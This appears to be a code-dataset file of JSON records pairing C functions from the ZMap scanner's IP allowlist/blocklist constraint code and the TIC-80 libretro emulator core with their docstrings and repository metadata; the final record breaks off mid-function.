{"docstring": "// For a given value, return the IP address with zero-based index n.\n// (i.e., if there are three addresses with value 0xFF, looking up index 1\n// will return the second one).\n// Note that the tree must have been previously painted with this value.\n", "func_signal": "uint32_t constraint_lookup_index(constraint_t *con, uint64_t index,\n\t\t\t\t value_t value)", "code": "{\n\tassert(con);\n\tif (!con->painted || con->paint_value != value) {\n\t\tconstraint_paint_value(con, value);\n\t}\n\n\tuint64_t radix_idx = index / (1 << (32 - RADIX_LENGTH));\n\tif (radix_idx < con->radix_len) {\n\t\t// Radix lookup\n\t\tuint32_t radix_offset =\n\t\t    index % (1 << (32 - RADIX_LENGTH)); // TODO: bitwise maths\n\t\treturn con->radix[radix_idx] | radix_offset;\n\t}\n\n\t// Otherwise, do the \"slow\" lookup in tree.\n\t// Note that tree counts do NOT include things in the radix,\n\t// so we subtract these off here.\n\tindex -= con->radix_len * (1 << (32 - RADIX_LENGTH));\n\tassert(index < con->root->count);\n\treturn _lookup_index(con->root, index);\n}", "path": "zmap/lib/constraint.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
{"docstring": "// Initialize address constraints from allowlist and blocklist files.\n// Either can be set to NULL to omit.\n", "func_signal": "int blocklist_init(char *allowlist_filename, char *blocklist_filename,\n\t\t   char **allowlist_entries, size_t allowlist_entries_len,\n\t\t   char **blocklist_entries, size_t blocklist_entries_len,\n\t\t   int ignore_invalid_hosts)", "code": "{\n\tassert(!constraint);\n\n\tblocklisted_cidrs = xcalloc(1, sizeof(bl_ll_t));\n\tallowlisted_cidrs = xcalloc(1, sizeof(bl_ll_t));\n\n\tif (allowlist_filename && allowlist_entries) {\n\t\tlog_warn(\"allowlist\",\n\t\t\t \"both a allowlist file and destination addresses \"\n\t\t\t \"were specified. The union of these two sources \"\n\t\t\t \"will be utilized.\");\n\t}\n\tif (allowlist_filename || allowlist_entries_len > 0) {\n\t\t// using a allowlist, so default to allowing nothing\n\t\tconstraint = constraint_init(ADDR_DISALLOWED);\n\t\tlog_debug(\"constraint\", \"blocklisting 0.0.0.0/0\");\n\t\tif (allowlist_filename) {\n\t\t\tinit_from_file(allowlist_filename, \"allowlist\",\n\t\t\t\t       ADDR_ALLOWED, ignore_invalid_hosts);\n\t\t}\n\t\tif (allowlist_entries) {\n\t\t\tinit_from_array(allowlist_entries,\n\t\t\t\t\tallowlist_entries_len, ADDR_ALLOWED,\n\t\t\t\t\tignore_invalid_hosts);\n\t\t}\n\t} else {\n\t\t// no allowlist, so default to allowing everything\n\t\tlog_debug(\"blocklist\",\n\t\t\t  \"no allowlist file or allowlist entries provided\");\n\t\tconstraint = constraint_init(ADDR_ALLOWED);\n\t}\n\tif (blocklist_filename) {\n\t\tinit_from_file(blocklist_filename, \"blocklist\", ADDR_DISALLOWED,\n\t\t\t       ignore_invalid_hosts);\n\t}\n\tif (blocklist_entries) {\n\t\tinit_from_array(blocklist_entries, blocklist_entries_len,\n\t\t\t\tADDR_DISALLOWED, ignore_invalid_hosts);\n\t}\n\tinit_from_string(strdup(\"0.0.0.0\"), ADDR_DISALLOWED);\n\tconstraint_paint_value(constraint, ADDR_ALLOWED);\n\tuint64_t allowed = blocklist_count_allowed();\n\tlog_debug(\"constraint\",\n\t\t  \"%lu addresses (%0.0f%% of address \"\n\t\t  \"space) can be scanned\",\n\t\t  allowed, allowed * 100. / ((long long int)1 << 32));\n\tif (!allowed) {\n\t\tlog_error(\"blocklist\",\n\t\t\t  \"no addresses are eligible to be scanned in the \"\n\t\t\t  \"current configuration. This may be because the \"\n\t\t\t  \"blocklist being used by ZMap (%s) prevents \"\n\t\t\t  \"any addresses from receiving probe packets.\",\n\t\t\t  blocklist_filename);\n\t\treturn EXIT_FAILURE;\n\t}\n\treturn EXIT_SUCCESS;\n}", "path": "zmap/lib/blocklist.c", "commit_date": "2020-07-06 00:00:00", "repo_name": "zmap/zmap", "stars": 5209, "license": "apache-2.0", "language": "c", "size": 6344}
{"docstring": "/**\n * libretro callback; Given the serialized data, load it into the persistent memory.\n */\n", "func_signal": "RETRO_API bool retro_unserialize(const void *data, size_t size)", "code": "{\n\tif (state == NULL || state->tic == NULL || size != retro_serialize_size() || data == NULL) {\n\t\treturn false;\n\t}\n\n\ttic80_local* tic80 = (tic80_local*)state->tic;\n\tu32* uData = (u32*)data;\n\tfor (int i = 0; i < TIC_PERSISTENT_SIZE; i++) {\n\t\ttic80->memory->ram.persistent.data[i] = uData[i];\n\t}\n\n\treturn true;\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/**\n * libretro callback; Load the labels for the input buttons.\n *\n * @see tic80_libretro_update()\n */\n", "func_signal": "void tic80_libretro_input_descriptors()", "code": "{\n\t// TIC-80's controller has flipped A/B and X/Y buttons than RetroPad.\n\tstruct retro_input_descriptor desc[] = {\n\n#if TIC_MAXPLAYERS >= 1\n\t\t// Player 1\n\t\t{ 0, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_LEFT, \"D-Pad Left\" },\n\t\t{ 0, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_UP, \"D-Pad Up\" },\n\t\t{ 0, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_DOWN, \"D-Pad Down\" },\n\t\t{ 0, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_RIGHT, \"D-Pad Right\" },\n\t\t{ 0, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_B, \"A\" },\n\t\t{ 0, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_A, \"B\" },\n\t\t{ 0, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_X, \"Y\" },\n\t\t{ 0, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_Y, \"X\" },\n#endif\n\n#if TIC_MAXPLAYERS >= 2\n\t\t// Player 2\n\t\t{ 1, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_LEFT, \"D-Pad Left\" },\n\t\t{ 1, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_UP, \"D-Pad Up\" },\n\t\t{ 1, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_DOWN, \"D-Pad Down\" },\n\t\t{ 1, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_RIGHT, \"D-Pad Right\" },\n\t\t{ 1, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_B, \"A\" },\n\t\t{ 1, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_A, \"B\" },\n\t\t{ 1, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_X, \"Y\" },\n\t\t{ 1, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_Y, \"X\" },\n#endif\n\n#if TIC_MAXPLAYERS >= 3\n\t\t// Player 3\n\t\t{ 2, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_LEFT, \"D-Pad Left\" },\n\t\t{ 2, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_UP, \"D-Pad Up\" },\n\t\t{ 2, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_DOWN, \"D-Pad Down\" },\n\t\t{ 2, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_RIGHT, \"D-Pad Right\" },\n\t\t{ 2, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_B, \"A\" },\n\t\t{ 2, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_A, \"B\" },\n\t\t{ 2, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_X, \"Y\" },\n\t\t{ 2, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_Y, \"X\" },\n#endif\n\n#if TIC_MAXPLAYERS >= 4\n\t\t// Player 4\n\t\t{ 3, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_LEFT, \"D-Pad Left\" },\n\t\t{ 3, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_UP, \"D-Pad Up\" },\n\t\t{ 3, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_DOWN, \"D-Pad Down\" },\n\t\t{ 3, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_RIGHT, \"D-Pad Right\" },\n\t\t{ 3, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_B, \"A\" },\n\t\t{ 3, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_A, \"B\" },\n\t\t{ 3, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_X, \"Y\" },\n\t\t{ 3, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_Y, \"X\" },\n#endif\n\n\t\t{ 0 },\n\t};\n\n\tenviron_cb(RETRO_ENVIRONMENT_SET_INPUT_DESCRIPTORS, desc);\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/**\n * libretro callback; Load a game.\n */\n", "func_signal": "RETRO_API bool retro_load_game(const struct retro_game_info *info)", "code": "{\n\t// TODO: Warn that Audio Synchronization required to run at a proper speed.\n\t// TODO: Warn that the core doesn't support Runahead.\n\n\t// Initialize the core if it hasn't been yet.\n\tif (state == NULL) {\n\t\tretro_init();\n\t}\n\n\t// Pixel format.\n\tenum retro_pixel_format fmt = RETRO_PIXEL_FORMAT_XRGB8888;\n\tif (!environ_cb(RETRO_ENVIRONMENT_SET_PIXEL_FORMAT, &fmt)) {\n\t\tlog_cb(RETRO_LOG_ERROR, \"[TIC-80] RETRO_PIXEL_FORMAT_XRGB8888 is not supported.\\n\");\n\t\treturn false;\n\t}\n\n\t// Check for the content.\n\tif (info == NULL) {\n\t\tlog_cb(RETRO_LOG_ERROR, \"[TIC-80] No content information provided.\\n\");\n\t\treturn false;\n\t}\n\n\t// Ensure content data is available.\n\tif (info->data == NULL) {\n\t\tlog_cb(RETRO_LOG_ERROR, \"[TIC-80] No content data provided.\\n\");\n\t\treturn false;\n\t}\n\n\t// Set up the TIC-80 environment.\n\tstate->tic = tic80_create(TIC80_SAMPLERATE);\n\tif (state->tic == NULL) {\n\t\tlog_cb(RETRO_LOG_ERROR, \"[TIC-80] Failed to initialize TIC-80 environment.\\n\");\n\t\treturn false;\n\t}\n\n\t// Set up the environment variables.\n\tstate->tic->screen_format = TIC80_PIXEL_COLOR_BGRA8888;\n\tstate->tic->callback.exit = tic80_libretro_exit;\n\tstate->tic->callback.error = tic80_libretro_error;\n\tstate->tic->callback.trace = tic80_libretro_trace;\n\n\t// Initialize some of the game state.\n\tstate->quit = false;\n\tstate->input.mouse.x = 0;\n\tstate->input.mouse.y = 0;\n\n\t// Load the content.\n\t// TODO: Allow loading code files directly.\n\ttic80_load(state->tic, (void*)(info->data), (int)info->size);\n\tif (state->tic == NULL) {\n\t\tlog_cb(RETRO_LOG_ERROR, \"[TIC-80] Content loaded, but failed to load game.\\n\");\n\t\tretro_unload_game();\n\t\treturn false;\n\t}\n\n\t// Set up the input descriptors.\n\ttic80_libretro_input_descriptors();\n\n\t// Load up any core variables.\n\ttic80_libretro_variables();\n\n\treturn true;\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/**\n * libretro callback; Render the screen and play the audio.\n */\n", "func_signal": "RETRO_API void retro_run(void)", "code": "{\n\t// Ensure the state is set up.\n\tif (state == NULL || state->tic == NULL) {\n\t\treturn;\n\t}\n\n\t// Update the TIC-80 environment.\n\ttic80_libretro_update(state->tic);\n\n\t// Check if the game requested to quit.\n\tif (state->quit) {\n\t\tretro_deinit();\n\t\tenviron_cb(RETRO_ENVIRONMENT_SHUTDOWN, NULL);\n\t\treturn;\n\t}\n\n\t// Render the screen.\n\ttic80_libretro_draw(state->tic);\n\n\t// Play the audio.\n\ttic80_libretro_audio(state->tic);\n\n\t// Update core options, if needed.\n\tbool updated = false;\n\tif (environ_cb(RETRO_ENVIRONMENT_GET_VARIABLE_UPDATE, &updated) && updated) {\n\t\ttic80_libretro_variables();\n\t}\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/**\n * Retrieve gamepad information from libretro.\n *\n * @see tic80_libretro_update()\n */\n", "func_signal": "void tic80_libretro_update_gamepad(tic80_gamepad* gamepad, int player)", "code": "{\n\t// D-Pad\n\tgamepad->up = input_state_cb(player, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_UP);\n\tgamepad->down = input_state_cb(player, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_DOWN);\n\tgamepad->left = input_state_cb(player, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_LEFT);\n\tgamepad->right = input_state_cb(player, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_RIGHT);\n\n\t// A/B and X/Y are switched in TIC-80\n\tgamepad->a = input_state_cb(player, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_B);\n\tgamepad->b = input_state_cb(player, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_A);\n\tgamepad->x = input_state_cb(player, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_Y);\n\tgamepad->y = input_state_cb(player, RETRO_DEVICE_JOYPAD, 0, RETRO_DEVICE_ID_JOYPAD_X);\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/**\n * libretro callback; Handles the logging internally when the logging isn't set.\n */\n", "func_signal": "void tic80_libretro_fallback_log(enum retro_log_level level, const char *fmt, ...)", "code": "{\n\t(void)level;\n\tva_list va;\n\tva_start(va, fmt);\n\tvfprintf(stderr, fmt, va);\n\tva_end(va);\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/**\n * TIC-80 callback; Requests the content to exit.\n */\n", "func_signal": "void tic80_libretro_exit()", "code": "{\n\tif (state != NULL) {\n\t\tstate->quit = true;\n\t}\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/**\n * TIC-80 callback; Report an error from the TIC-80 cart.\n */\n", "func_signal": "void tic80_libretro_error(const char* info)", "code": "{\n\t// Report the error to the log.\n\tlog_cb(RETRO_LOG_ERROR, \"[TIC-80]: %s\\n\", info);\n\n\t// Display the error on the screen, if possible.\n\tif (environ_cb) {\n\t\tstruct retro_message msg = {\n\t\t\tinfo,\n\t\t\t400\n\t\t};\n\t\tenviron_cb(RETRO_ENVIRONMENT_SET_MESSAGE, &msg);\n\t}\n\n\t// Finally, on an error, close the core.\n\ttic80_libretro_exit();\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/**\n * libretro callback; Retrieves information about the core.\n */\n", "func_signal": "RETRO_API void retro_get_system_info(struct retro_system_info *info)", "code": "{\n\tmemset(info, 0, sizeof(*info));\n\tinfo->library_name     = TIC_NAME;\n\tinfo->library_version  = TIC_VERSION_LABEL;\n\tinfo->valid_extensions = \"tic\";\n\tinfo->need_fullpath    = false;\n\tinfo->block_extract    = false;\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/**\n * Update the state of the core variables.\n *\n * @see retro_run()\n */\n", "func_signal": "void tic80_libretro_variables(void)", "code": "{\n\t// Check all the individual variables for the core.\n\tstruct retro_variable var;\n\n\t// Mouse is Pointer device.\n\tstate->variablePointerApi = false;\n\tvar.key = \"tic80_mouse_pointer\";\n\tvar.value = NULL;\n\tif (environ_cb(RETRO_ENVIRONMENT_GET_VARIABLE, &var) && var.value) {\n\t\tstate->variablePointerApi = strcmp(var.value, \"enabled\") == 0;\n\t}\n\n\t// Mouse Cursor\n\tstate->mouseCursor = 0;\n\tvar.key = \"tic80_mouse_cursor\";\n\tvar.value = NULL;\n\tif (environ_cb(RETRO_ENVIRONMENT_GET_VARIABLE, &var) && var.value) {\n\t\tif (strcmp(var.value, \"dot\") == 0) {\n\t\t\tstate->mouseCursor = 1;\n\t\t}\n\t\telse if (strcmp(var.value, \"cross\") == 0) {\n\t\t\tstate->mouseCursor = 2;\n\t\t}\n\t\telse if (strcmp(var.value, \"arrow\") == 0) {\n\t\t\tstate->mouseCursor = 3;\n\t\t}\n\t}\n\n\t// Mouse Hide Delay\n\tstate->mouseHideTimerStart = -1;\n\tvar.key = \"tic80_mouse_hide_delay\";\n\tvar.value = NULL;\n\tif (environ_cb(RETRO_ENVIRONMENT_GET_VARIABLE, &var) && var.value) {\n\t\tstate->mouseHideTimerStart = atoi(var.value);\n\t\tif (state->mouseHideTimerStart > 0) {\n\t\t\tstate->mouseHideTimerStart = state->mouseHideTimerStart * TIC80_FRAMERATE;\n\t\t}\n\t\telse {\n\t\t\tstate->mouseHideTimerStart = -1;\n\t\t}\n\t}\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/**\n * libretro callback; Global initialization.\n */\n", "func_signal": "RETRO_API void retro_init(void)", "code": "{\n\t// Ensure the state is ready.\n\tif (state != NULL) {\n\t\tretro_deinit();\n\t}\n\n\t// Initialize the base state.\n\tstate = (struct tic80_state*) malloc(sizeof(struct tic80_state));\n\tstate->quit = false;\n\tstate->variablePointerApi = false;\n\tstate->mouseCursor = 0;\n\tstate->mousePreviousX = 0;\n\tstate->mousePreviousY = 0;\n\tstate->mouseHideTimer = state->mouseHideTimerStart;\n\n\t// Initialize the keyboard mappings.\n\tstate->keymap[RETROK_UNKNOWN] = tic_key_unknown;\n\tstate->keymap[RETROK_a] = tic_key_a;\n\tstate->keymap[RETROK_b] = tic_key_b;\n\tstate->keymap[RETROK_c] = tic_key_c;\n\tstate->keymap[RETROK_d] = tic_key_d;\n\tstate->keymap[RETROK_e] = tic_key_e;\n\tstate->keymap[RETROK_f] = tic_key_f;\n\tstate->keymap[RETROK_g] = tic_key_g;\n\tstate->keymap[RETROK_h] = tic_key_h;\n\tstate->keymap[RETROK_i] = tic_key_i;\n\tstate->keymap[RETROK_j] = tic_key_j;\n\tstate->keymap[RETROK_k] = tic_key_k;\n\tstate->keymap[RETROK_l] = tic_key_l;\n\tstate->keymap[RETROK_m] = tic_key_m;\n\tstate->keymap[RETROK_n] = tic_key_n;\n\tstate->keymap[RETROK_o] = tic_key_o;\n\tstate->keymap[RETROK_p] = tic_key_p;\n\tstate->keymap[RETROK_q] = tic_key_q;\n\tstate->keymap[RETROK_r] = tic_key_r;\n\tstate->keymap[RETROK_s] = tic_key_s;\n\tstate->keymap[RETROK_t] = tic_key_t;\n\tstate->keymap[RETROK_u] = tic_key_u;\n\tstate->keymap[RETROK_v] = tic_key_v;\n\tstate->keymap[RETROK_w] = tic_key_w;\n\tstate->keymap[RETROK_x] = tic_key_x;\n\tstate->keymap[RETROK_y] = tic_key_y;\n\tstate->keymap[RETROK_z] = tic_key_z;\n\tstate->keymap[RETROK_0] = tic_key_0;\n\tstate->keymap[RETROK_1] = tic_key_1;\n\tstate->keymap[RETROK_2] = tic_key_2;\n\tstate->keymap[RETROK_3] = tic_key_3;\n\tstate->keymap[RETROK_4] = tic_key_4;\n\tstate->keymap[RETROK_5] = tic_key_5;\n\tstate->keymap[RETROK_6] = tic_key_6;\n\tstate->keymap[RETROK_7] = tic_key_7;\n\tstate->keymap[RETROK_8] = tic_key_8;\n\tstate->keymap[RETROK_9] = tic_key_9;\n\tstate->keymap[RETROK_KP0] = tic_key_0;\n\tstate->keymap[RETROK_KP1] = tic_key_1;\n\tstate->keymap[RETROK_KP2] = tic_key_2;\n\tstate->keymap[RETROK_KP3] = tic_key_3;\n\tstate->keymap[RETROK_KP4] = tic_key_4;\n\tstate->keymap[RETROK_KP5] = tic_key_5;\n\tstate->keymap[RETROK_KP6] = tic_key_6;\n\tstate->keymap[RETROK_KP7] = tic_key_7;\n\tstate->keymap[RETROK_KP8] = tic_key_8;\n\tstate->keymap[RETROK_KP9] = tic_key_9;\n\tstate->keymap[RETROK_MINUS] = tic_key_minus;\n\tstate->keymap[RETROK_EQUALS] = tic_key_equals;\n\tstate->keymap[RETROK_LEFTBRACKET] = tic_key_leftbracket;\n\tstate->keymap[RETROK_RIGHTBRACKET] = tic_key_rightbracket;\n\tstate->keymap[RETROK_BACKSLASH] = tic_key_backslash;\n\tstate->keymap[RETROK_SEMICOLON] = tic_key_semicolon;\n\tstate->keymap[RETROK_QUOTE] = tic_key_apostrophe;\n\tstate->keymap[RETROK_TILDE] = tic_key_grave;\n\tstate->keymap[RETROK_COMMA] = tic_key_comma;\n\tstate->keymap[RETROK_PERIOD] = tic_key_period;\n\tstate->keymap[RETROK_SLASH] = tic_key_slash;\n\tstate->keymap[RETROK_SPACE] = tic_key_space;\n\tstate->keymap[RETROK_TAB] = tic_key_tab;\n\tstate->keymap[RETROK_RETURN] = tic_key_return;\n\tstate->keymap[RETROK_BACKSPACE] = tic_key_backspace;\n\tstate->keymap[RETROK_DELETE] = tic_key_delete;\n\tstate->keymap[RETROK_INSERT] = tic_key_insert;\n\tstate->keymap[RETROK_PAGEUP] = tic_key_pageup;\n\tstate->keymap[RETROK_PAGEDOWN] = tic_key_pagedown;\n\tstate->keymap[RETROK_HOME] = tic_key_home;\n\tstate->keymap[RETROK_END] = tic_key_end;\n\tstate->keymap[RETROK_UP] = tic_key_up;\n\tstate->keymap[RETROK_DOWN] = tic_key_down;\n\tstate->keymap[RETROK_LEFT] = tic_key_left;\n\tstate->keymap[RETROK_RIGHT] = tic_key_right;\n\tstate->keymap[RETROK_CAPSLOCK] = tic_key_capslock;\n\tstate->keymap[RETROK_LCTRL] = tic_key_ctrl;\n\tstate->keymap[RETROK_RCTRL] = tic_key_ctrl;\n\tstate->keymap[RETROK_LSHIFT] = tic_key_shift;\n\tstate->keymap[RETROK_RSHIFT] = tic_key_shift;\n\tstate->keymap[RETROK_LALT] = tic_key_alt;\n\tstate->keymap[RETROK_RALT] = tic_key_alt;\n\tstate->keymap[RETROK_ESCAPE] = tic_key_escape;\n\tstate->keymap[RETROK_F1] = tic_key_f1;\n\tstate->keymap[RETROK_F2] = tic_key_f2;\n\tstate->keymap[RETROK_F3] = tic_key_f3;\n\tstate->keymap[RETROK_F4] = tic_key_f4;\n\tstate->keymap[RETROK_F5] = tic_key_f5;\n\tstate->keymap[RETROK_F6] = tic_key_f6;\n\tstate->keymap[RETROK_F7] = tic_key_f7;\n\tstate->keymap[RETROK_F8] = tic_key_f8;\n\tstate->keymap[RETROK_F9] = tic_key_f9;\n\tstate->keymap[RETROK_F10] = tic_key_f10;\n\tstate->keymap[RETROK_F11] = tic_key_f11;\n\tstate->keymap[RETROK_F12] = tic_key_f12;\n\tstate->keymap[RETROK_F12] = tic_key_f12;\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/**\n * libretro callback; Enable/disable the given cheat code.\n *\n * TIC-80 codes expect a space-seperated list of paired\n * integers. The first number is the index in pmem(), the\n * second value is the value for the pmem() call. Example:\n *\n * ```\n * cheats = 1\n *\n * cheat0_desc = \"3 Lives\"\n * cheat0_code = \"255 3\"\n * cheat0_enable = false\n * ```\n *\n * The above cheat would be the same as calling:\n *\n * pmem(255, 3)\n *\n * @see https://github.com/nesbox/TIC-80/wiki/pmem\n */\n", "func_signal": "RETRO_API void retro_cheat_set(unsigned index, bool enabled, const char *code)", "code": "{\n\tif (!state || !state->tic) {\n\t\treturn;\n\t}\n\n\tu32 codes[TIC_PERSISTENT_SIZE];\n\tint codeIndex = 0;\n\tchar *str = (char*)code;\n\tchar *end = str;\n\n\t// Split the code by spaces, to get an array of integers.\n\twhile (*end && codeIndex < TIC_PERSISTENT_SIZE) {\n\t\tcodes[codeIndex++] = strtol(str, &end, 10);\n\t\twhile (*end == ' ') {\n\t\t\tend++;\n\t\t}\n\t\tstr = end;\n\t}\n\n\t// Finally, set each given code pair.\n\ttic80_local* tic80 = (tic80_local*)state->tic;\n\tfor (int i = 0; i < codeIndex; i = i + 2) {\n\t\ttic80->memory->ram.persistent.data[codes[i]] = codes[i+1];\n\t}\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/**\n * Converts a Pointer API coordinates to screen pixel position.\n *\n * @see tic80_libretro_update_mouse()\n * @see RETRO_DEVICE_POINTER\n */\n", "func_signal": "int tic80_libretro_mouse_pointer_convert(float coord, float full)", "code": "{\n\tfloat max = 0x7fff;\n\treturn (int)((coord + max) / (max * 2.0f) * full);\n}", "path": "TIC-80/src/system/libretro/tic80_libretro.c", "commit_date": "2020-10-29 00:00:00", "repo_name": "nesbox/TIC-80", "stars": 4660, "license": "mit", "language": "c", "size": 127745}
{"docstring": "/**\n * Retrieve gamepad information from libretro.\n */\n", "func_signal": "void tic80_libretro_update_mouse(tic80_mouse* mouse)", "code": "{\n\t// Check if we are to use the Mouse API or Pointer API.\n\tif (!state->variablePointerApi) {\n\t\t// Get the Mouse X and Y, which is the relative positioning from last tick.\n\t\tmouse->x += input_state_cb(0, RETRO_DEVICE_MOUSE, 0, RETRO_DEVICE_ID_MOUSE_X);\n\t\tmouse->y += input_state_cb(0, RETRO_DEVICE_MOUSE, 0, RETRO_DEVICE_ID_MOUSE_Y);\n\n\t\t// Mouse buttons.\n\t\tmouse->left = input_state_cb(0, RETRO_DEVICE_MOUSE, 0, RETRO_DEVICE_ID_MOUSE_LEFT);\n\t\tmouse->right = input_state_cb(0, RETRO_DEVICE_MOUSE, 0, RETRO_DEVICE_ID_MOUSE_RIGHT);\n\t\tmouse->middle = input_state_cb(0, RETRO_DEVICE_MOUSE, 0, RETRO_DEVICE_ID_MOUSE_MIDDLE);\n\t}\n\telse {\n\t\t// Get the Pointer X and Y, and convert it to screen position.\n\t\tmouse->x = tic80_libretro_mouse_pointer_convert(\n\t\t\tinput_state_cb(0, RETRO_DEVICE_POINTER, 0, RETRO_DEVICE_ID_POINTER_X),\n\t\t\tTIC80_FULLWIDTH);\n\t\tmouse->y = tic80_libretro_mouse_pointer_convert(\n\t\t\tinput_state_cb(0, RETRO_DEVICE_POINTER, 0, RETRO_DEVICE_ID_POINTER_Y),\n\t\t\tTIC80_FULLHEIGHT);\n\n\t\t// Pointer pressed is considered mouse left button.\n\t\tmouse->left = input_state_cb(0, RETRO_DEVICE_POINTER, 0, RETRO_DEVICE_ID_POINTER_PRESSED);\n\t\tmouse->right = input_state_cb(0, RETRO_DEVICE_MOUSE, 0, RETRO_DEVICE_ID_MOUSE_RIGHT);\n\t\tmouse->middle = input_state_cb(0, RETRO_DEVICE_MOUSE, 0, RETRO_DEVICE_ID_MOUSE_MIDDLE);\n\t}\n\n\t// Keep the mouse on the screen.\n\tif (mouse->x >= TIC80_FULLWIDTH) {\n\t\tmouse->x = TIC80_FULLWIDTH-1;\n\t}\n\tif (mouse->y >= TIC80_FULLHEIGHT) {\n\t\tmouse->y = TIC80_FULLHEIGHT-1;\n\t}\n\tif (mouse->x < 0) {\n\t\tmouse->x = 0;\n\t}\n\tif (mouse->y < 0) {\n\t\tmouse->y = 0;\n\t}\n\n\t// Have the mouse disappear after a certain time of inactivity.\n\tif (mouse->x != state->mousePreviousX || mouse->y != state->mousePreviousY) {\n\t\tstate->mouseHideTimer = state->mouseHideTimerStart;\n\t\tstate->mousePreviousX = mouse->x;\n\t\tstate->mousePreviousY = mouse->y;\n\t}\n\tif (state->mouseHideTimer > 0) {\n\t\tstate->mouseHideTimer--;\n\t}\n\n\t// Mouse Scroll Wheels\n\tmouse->scrollx = mouse->scrolly = 0;\n\tif (input_state_cb(0, RETRO_DEVICE_MOUSE, 0, 